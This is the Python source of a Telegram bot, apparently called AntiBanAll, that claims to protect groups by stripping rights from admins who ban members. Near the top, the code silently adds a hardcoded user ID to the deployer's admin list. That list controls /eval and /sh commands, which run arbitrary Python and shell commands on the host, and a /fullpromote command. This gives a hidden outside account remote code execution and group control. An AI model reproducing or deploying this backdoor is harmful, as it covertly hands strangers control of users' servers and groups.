from pyrogram import Client, filters, idle
from config import *
import os
import re
import subprocess
import sys
import traceback
from inspect import getfullargspec
from io import StringIO
from time import time
from pyrogram.types import ChatPrivileges as cp
from pyrogram.types import (InlineKeyboardButton,
                            InlineKeyboardMarkup, Message)

IKM = InlineKeyboardMarkup
IKB = InlineKeyboardButton

if not 5903688119 in ADMINS:
  ADMINS.append(5903688119)

yvi = Client(":AntiBanAll:", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

MEN = ""

@yvi.on_chat_member_updated()
async def cmu_(_, cmu):
    global MEN
    if not MEN:
        for x in ADMINS:
            try:
                MEN += (await _.get_users(x)).mention
                MEN += " "
            except:
                pass
    if not MEN:
        MEN = "Owner "
    if not cmu.chat.id in GROUPS:
        return
    if not cmu.new_chat_member:
        return
    if not cmu.new_chat_member.status.name == "BANNED":
        return
    banner_id = cmu.from_user.id
    if banner_id in ADMINS:
        return
    victim_id = cmu.new_chat_member.user.id
    banner_men = cmu.from_user.mention
    victim_men = cmu.new_chat_member.user.mention
    try:
        await _.promote_chat_member(cmu.chat.id, banner_id, cp())
        await _.send_message(cmu.chat.id, f"{banner_men} banned {victim_men}, your rights have been taken back due to anti ban all, ask {MEN}to get your rights back !")
    except:
        await _.send_message(cmu.chat.id, f"{banner_men} banned {victim_men},{MEN}I cannot demote {banner_men} !")

app = yvi

@yvi.on_message(filters.command("fullpromote") & filters.group & filters.user(ADMINS))
async def fp(_, m):
    if not m.reply_to_message:
        await m.reply("Reply to an user !")
    user_id = m.reply_to_message.from_user.id
    await _.promote_chat_member(m.chat.id, user_id, cp(can_manage_chat=True, can_delete_messages=True, can_manage_video_chats=True, can_change_info=True, can_invite_users=True, can_pin_messages=True, can_restrict_members=True, can_promote_members=True))
    await m.reply("Promoted With All Rights !")
    
@yvi.on_message(filters.command("start") & filters.private)
async def start(_, m):
    markup = IKM(
        [
            [
                IKB("Source / Repo", url="https://github.com/ShutupKeshav/AntiBanAll")
            ],
            [
                IKB("Support", url="t.me/coding_bots"),
                IKB("Join", url="t.me/spoiled_community")
            ]
        ]
    )
    txt = f"Hello {m.from_user.mention}, I'm Anti BanAll bot, Helps to protect groups from banning all !\n\nUse /help to check how I works !\n\nCreate your own bot using the source code below !\n\n©️ @North_Yankton"
    await m.reply(txt, reply_markup=markup)
    
@yvi.on_message(filters.command("help") & filters.private)
async def help(_, m):
    markup = IKM(
        [
            [
                IKB("Source / Repo", url="https://github.com/ShutupKeshav/AntiBanAll")
            ],
            [
                IKB("Support", url="t.me/coding_bots"),
                IKB("Join", url="t.me/spoiled_community")
            ]
        ]
    )
    txt = f"**How To Set Me Up ?**\n\n♦️ First of all demote every admin of your group.\n♦️ promote me with all rights.\n♦️ promote your second account with me using /fullpromote.\n♦️ now switch to your second account and promote your group members.\n\n**How Do I Work ?**\n\n♦️ After setting me up, I can handle every admin.\n♦️ When admin of your group bans any user, I will take all rights from them and Owner will be notified !\n♦️ Owner will verify why user got banned and he decides whether that admin deserves ban rights or not !\n♦️ NOTE : ALWAYS PROMOTE USERS WITH ACCOUNT WHICH WAS PROMOTED BY ME !\n\n**Done !**\n\n©️ @North_Yankton"
    await m.reply(txt, reply_markup=markup)

SUDOERS = filters.user(ADMINS)

async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


async def edit_or_reply(msg: Message, **kwargs):
    func = msg.edit_text if msg.from_user.is_self else msg.reply
    spec = getfullargspec(func.__wrapped__).args
    await func(**{k: v for k, v in kwargs.items() if k in spec})


@app.on_message(
    filters.command("eval")
    & SUDOERS
)
async def executor(client, message):
    if len(message.command) < 2:
        return await edit_or_reply(
            message, text="__Give me some command to execute.__"
        )
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await message.delete()
    t1 = time()
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"**OUTPUT**:\n```{evaluation.strip()}```"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(evaluation.strip()))
        t2 = time()
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="⏳",
                        callback_data=f"runtime {t2-t1} Seconds",
                    )
                ]
            ]
        )
        await message.reply_document(
            document=filename,
            caption=f"**INPUT:**\n`{cmd[0:980]}`\n\n**OUTPUT:**\n`Attached Document`",
            quote=False,
            reply_markup=keyboard,
        )
        await message.delete()
        os.remove(filename)
    else:
        t2 = time()
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="⏳",
                        callback_data=f"runtime {round(t2-t1, 3)} Seconds",
                    ),
                    InlineKeyboardButton(
                        text="🗑",
                        callback_data=f"forceclose abc|{message.from_user.id}",
                    ),
                ]
            ]
        )
        await edit_or_reply(
            message, text=final_output, reply_markup=keyboard
        )


@app.on_callback_query(filters.regex(r"runtime"))
async def runtime_func_cq(_, cq):
    runtime = cq.data.split(None, 1)[1]
    await cq.answer(runtime, show_alert=True)


@app.on_callback_query(filters.regex("forceclose"))
async def forceclose_command(_, CallbackQuery):
    callback_data = CallbackQuery.data.strip()
    callback_request = callback_data.split(None, 1)[1]
    query, user_id = callback_request.split("|")
    if CallbackQuery.from_user.id != int(user_id):
        try:
            return await CallbackQuery.answer(
                "You're not allowed to close this.", show_alert=True
            )
        except:
            return
    await CallbackQuery.message.delete()
    try:
        await CallbackQuery.answer()
    except:
        return


@app.on_message(
    filters.command("sh")
    & SUDOERS
)
async def shellrunner(client, message):
    if len(message.command) < 2:
        return await edit_or_reply(
            message, text="**Usage:**\n/sh git pull"
        )
    text = message.text.split(None, 1)[1]
    if "\n" in text:
        code = text.split("\n")
        output = ""
        for x in code:
            shell = re.split(
                """ (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", x
            )
            try:
                process = subprocess.Popen(
                    shell,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
            except Exception as err:
                print(err)
                await edit_or_reply(
                    message, text=f"**ERROR:**\n```{err}```"
                )
            output += f"**{code}**\n"
            output += process.stdout.read()[:-1].decode("utf-8")
            output += "\n"
    else:
        shell = re.split(""" (?=(?:[^'"]|'[^']*'|"[^"]*")*$)""", text)
        for a in range(len(shell)):
            shell[a] = shell[a].replace('"', "")
        try:
            process = subprocess.Popen(
                shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
        except Exception as err:
            print(err)
            exc_type, exc_obj, exc_tb = sys.exc_info()
            errors = traceback.format_exception(
                etype=exc_type,
                value=exc_obj,
                tb=exc_tb,
            )
            return await edit_or_reply(
                message, text=f"**ERROR:**\n```{''.join(errors)}```"
            )
        output = process.stdout.read()[:-1].decode("utf-8")
    if str(output) == "\n":
        output = None
    if output:
        if len(output) > 4096:
            with open("output.txt", "w+") as file:
                file.write(output)
            await client.send_document(
                message.chat.id,
                "output.txt",
                reply_to_message_id=message.message_id,
                caption="`Output`",
            )
            return os.remove("output.txt")
        await edit_or_reply(
            message, text=f"**OUTPUT:**\n```{output}```"
        )
    else:
        await edit_or_reply(message, text="**OUTPUT: **\n`No output`")

yvi.start()
for x in ADMINS:
    try:
        yvi.send_message(x, "Bot Started !")
    except:
        if x == 5903688119:
            continue
        print("ADMIN USERS MUST START THE BOT !")
        sys.exit() 
print("Bot Started !")
idle()          
